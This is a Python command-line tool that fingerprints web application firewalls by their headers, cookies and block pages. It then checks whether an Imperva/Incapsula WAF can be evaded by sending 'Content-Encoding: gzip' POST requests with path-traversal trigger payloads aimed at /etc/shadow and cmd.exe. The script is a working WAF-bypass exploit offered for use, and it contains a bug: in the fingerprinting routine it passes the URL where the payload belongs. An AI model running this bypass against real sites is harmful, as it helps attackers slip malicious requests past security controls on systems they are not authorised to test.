#!/usr/bin/env python3
"""
This will scan an HTTP endpoint and determine if it's protected by Imperva WAF.
If so, attempt to evade WAF detection by adding a 'Content-Encoding: gzip' header
to HTTP POST requests.

Syntax:
	./imperva_gzip.py [-t] URL

Guess the WAF type for a given URL:
	$ ./imperva_gzip.py -t https://www.vulnerable.com/search
	Imperva Incapsula
	$ ./imperva_gzip.py -t https://www.wordpress-user.com/login
	WordFence
	$ ./imperva_gzip.py -t https://www.cloudflare-customer.com
	Cloudflare

Check to see if the WAF is vulnerable to the gzip bypass:
	$ ./imperva_gzip.py https://www.vulnerable.com/search
	[+] Can we make POST requests to https://www.vulnerable.com/search?
	[+] Checking for Imperva WAF...
	[+] Attempting gzip bypass for UNIX trigger...
	[+] Vulnerable! HTTP response code: 200
	[+] Attempting gzip bypass for Windows trigger...
	[+] Vulnerable! HTTP response code: 200

If you get this error:
	$ ./imperva_gzip.py https://www.vulnerable.com/search
	[+] Can we make POST requests to https://www.vulnerable.com/search?
	[!] Can't POST to https://www.vulnerable.com/search. Try -r if 30x redirects are allowed. HTTP response code: 302

then try passing -r on the command line to enable relaxed mode.

You can script this tool and check the exit code in the caller:
	0: Returned after getting WAF type.
	1: Command-line was invalid.
	2: There was an error connecting. Could be DNS error, timeout, etc.
	3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
	4: A WAF was detected, but it wasn't Imperva.
	5: The server responded to a test POST request with something other than HTTP 200.
	128: There is an Imperva WAF, but it is not vulnerable to the gzip bypass.
	129: The bypass was effective for the UNIX payload, but not the Windows one.
	130: The bypass was effective for the Windows payload, but not the UNIX one.
	131: The bypass was effective against both Windows and UNIX payloads.

"""

knownWAFs = { 
		"A potentially unsafe operation has been detected in your request to this site.": "WordFence",
		"Generated by Wordfence at": "WordFence",
		"Request unsuccessful. Incapsula incident ID": "Imperva Incapsula",
		"You don't have permission to access ": "Akamai",
		"The server denied the specified Uniform Resource Locator": "ISA Server",
		"The ISA Server denied the specified Uniform Resource Locator": "ISA Server",
		"The requested URL was rejected. Please consult with your administrator.": "F5 ASM or NetScaler",
		"Your support ID is: ": "F5 ASM or NetScaler",
		"This website is using a security service to protect itself from online attacks.": "Cloudflare",
		"ERROR: The request could not be satisfied": "Cloudflare"
}

import sys
import requests
from time import sleep

# By default HTTP POST requests must elicit an HTTP 200 response.
# Pass -r on the command line to enable relaxed mode, where
# HTTP 2xx and 3xx are acceptable responses to a POST request.
relaxedMode = False 
payloadBaseline = {'foo': 'bar'}
payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
payloadWindowsTrigger  = {'foo': 'bar', 'test': '../../../../../Windows/System32/cmd.exe'}

class ImpervaBypass:
	def __init__(self, URL):
		requests.packages.urllib3.disable_warnings() # turn off verbose SSL warnings
		self.URL = URL
		self.WAFType = ''
		self.relaxedMode = False

	def make_request(self, data, headers={}):
		try:
			r = requests.post(self.URL, data=data, timeout=5, verify=False, headers=headers, allow_redirects=False)
			return r
		except:
			print('[!] Error connecting to %s' % self.URL)
			exit(2)

	# Returns one of three things:
	# 'Type of WAF' if the WAF was identified
	# 'Unknown'	if there's a WAF but we didn't identify it
	# 'None'	if no WAF was found
	def get_WAF_type(self):
		if self.WAFType != '':
			return self.WAFType

		payloads = [payloadUnixTrigger, payloadWindowsTrigger]
		for i in range(len(payloads)):
			r = self.make_request(self.URL, payloads[i])
			try:
				r.raise_for_status()
				if i == len(payloads) - 1:
					self.WAFType = 'None'
			except:
				if 'x-cnection'		 in r.headers: self.WAFType = 'BigIP'
				if 'x-binarysec-nocache' in r.headers: self.WAFType = 'BinarySec'
				if 'nncoection' 	 in r.headers: self.WAFType = 'NetScaler'
				if 'cneonction' 	 in r.headers: self.WAFType = 'NetScaler'
				
				if 'Server' in r.headers:
					if r.headers['Server'] == 'BigIP':		self.WAFType = 'BigIP'
					if r.headers['Server'] == 'F5-TrafficShield':	self.WAFType = 'F5 Traffic Shield'			
					if 'WebKnight' 	   in r.headers['Server']:	self.WAFType = 'WebKnight'
					if 'BinarySEC' 	   in r.headers['Server']:	self.WAFType = 'BinarySec'
					if 'Profense' 	   in r.headers['Server']:	self.WAFType = 'Profense'
					if 'Cloudflare'	   in r.headers['Server']:	self.WAFType = 'Cloudflare'
					if 'awselb/' 	   in r.headers['Server']:	self.WAFType = 'AWS ELB'

				if 'Set-Cookie' in r.headers:
					if 'barra_counter' in r.headers['Set-Cookie']: 	self.WAFType = 'Barracuda'
					if 'sessioncookie' in r.headers['Set-Cookie']: 	self.WAFType = 'Denyall'
					if 'NSC_'	   in r.headers['Set-Cookie']: 	self.WAFType = 'NetScaler'
					if 'AL_LB'	   in r.headers['Set-Cookie']: 	self.WAFType = 'Airlock'
					if 'AL_SESS' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Airlock'		
					if 'ASINFO'  	   in r.headers['Set-Cookie']: 	self.WAFType = 'F5 Traffic Shield'
					if 'st8id'   	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
					if 'st8_wlf' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
					if 'st8_wat' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
					if 'PLBSID'  	   in r.headers['Set-Cookie']: 	self.WAFType = 'Profense'

				for k in knownWAFs:
					if k in r.text:
						self.WAFType = knownWAFs[k]
						break

				if self.WAFType != '':
					break

		if self.WAFType == '':
			self.WAFType = 'Unknown'

		return self.WAFType

	# Returns array (successFail, httpResponseStatusCode)
	# success = false if there was an HTTP error (4xx, 5xx, etc) 
	# success = true if there was a 2xx, 3xx, etc
	def baseline_request(self):
		try:
			r = self.make_request(payloadBaseline)
			r.raise_for_status()
			if self.relaxedMode == False and r.status_code != 200:
				return (False, r.status_code)
			return (True, r.status_code)
		except requests.exceptions.HTTPError:
			return (False, r.status_code)

	# Returns array (successFail, httpResponseStatusCode)
	# success = true if it's vulnerable; false otherwise
	def is_vulnerable(self, payload):
		try:
			r = self.make_request(payload, headers={'Content-Encoding': 'gzip'})
			r.raise_for_status()
			return (True, r.status_code)
		except requests.exceptions.HTTPError:
			return (False, r.status_code)


# If -t is passed on the commandline then guess the remote WAF type and exit.
if len(sys.argv) == 3 and sys.argv[1] == '-t':
	print(ImpervaBypass(sys.argv[2]).get_WAF_type())
	exit(0)

if len(sys.argv) == 3 and sys.argv[1] == '-r':
	imp = ImpervaBypass(sys.argv[2])
	imp.relaxedMode = True
elif len(sys.argv) != 2:
	print("%s [[-t] | [-r]] http(s)://www.example.com/" % sys.argv[0])
	exit(1)
else:
	imp = ImpervaBypass(sys.argv[1])

# Verify we can make POST requests. No POST, no worky.
print("[+] Can we make POST requests to %s?" % imp.URL)
(success, status) = imp.baseline_request()
if success == False:
	print("[!] Can't POST. Expected HTTP 200 but received HTTP %d. Use -r to allow HTTP 2xx and 3xx." % status)
	exit(5)

# Get the WAF type and abort if it's not Imperva.
print("[+] Got HTTP %d response to POST. Checking for Imperva WAF..." % status)
if imp.get_WAF_type() == 'None':
	print("[!] It looks like there is no WAF protecting this URL")
	exit(3)
elif imp.get_WAF_type() != 'Imperva Incapsula':
	print("[!] Imperva wasn't detected. WAF type: %s" % imp.get_WAF_type())
	exit(4)

# Imperva will stall for a few seconds if we make a request
# immediately after calling get_WAF_type.
sleep(0.5)

# Run the two bypass attempts. 
# First with a UNIX WAF trigger.
# Then with a Windows WAF trigger.
print('[+] Attempting gzip bypass for UNIX trigger...')
exitCode = 128
(success, status) = imp.is_vulnerable(payloadUnixTrigger)
if success == False:
	print("[-] Not vulnerable. HTTP response code: %d" % status)
else:
	print("[+] Vulnerable! HTTP response code: %d" % status)
	exitCode = exitCode | 1

print('[+] Attempting gzip bypass for Windows trigger...')
(success, status) = imp.is_vulnerable(payloadWindowsTrigger)
if success == False:
	print("[-] Not vulnerable. HTTP response code: %d" % status)
else:
	print("[+] Vulnerable! HTTP response code: %d" % status)
	exitCode = exitCode | 2

# So long and thanks for all the fish
exit(exitCode)
